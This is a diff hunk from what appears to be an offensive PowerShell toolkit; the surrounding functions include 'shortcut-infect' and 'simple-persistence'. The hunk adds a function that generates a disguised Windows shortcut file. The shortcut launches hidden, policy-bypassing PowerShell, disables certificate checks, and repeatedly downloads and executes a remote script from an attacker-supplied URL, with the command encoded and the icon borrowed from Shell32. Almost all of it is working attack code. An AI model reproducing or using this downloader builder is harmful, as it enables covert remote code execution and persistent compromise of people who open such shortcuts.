@@ -794,6 +794,40 @@ function shortcut-infect($shortcutFullname, $scriptUrl) {
 
 }
 
+#[->] Has a .lnk kick off a looping powershell string.
+function gen-shortcut($scriptUrl) {
+
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+	{
+
+		#[->] prep command download string to be passed to obfuscation engine
+		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
+		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
+		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
+		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
+		$encCmdString = gen-enccmd $cmds
+		$argstring = '/q /c powershell.exe -noni -nop -w hidden -exec bypass -enc ' + $encCmdString
+
+
+		#[->] use obfuscated 
+		$WshShell = New-Object -comObject WScript.Shell
+		$shortcut = $WshShell.CreateShortcut(".\downloader.lnk")
+		$shortcut.TargetPath = "%comspec%"
+		$shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,1"
+		$Shortcut.Arguments = "$argstring" 
+		$Shortcut.Save()
+		
+		write-output "[+] Genrated lnk file to current working directory."
+
+	} else {
+	
+		write-output "[!] Failed!`n[!]You need to use a proper URL"
+        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+	}
+
+
+}
+
 function simple-persistence($scriptUrl) {
 
 	if ($scriptUrl) 
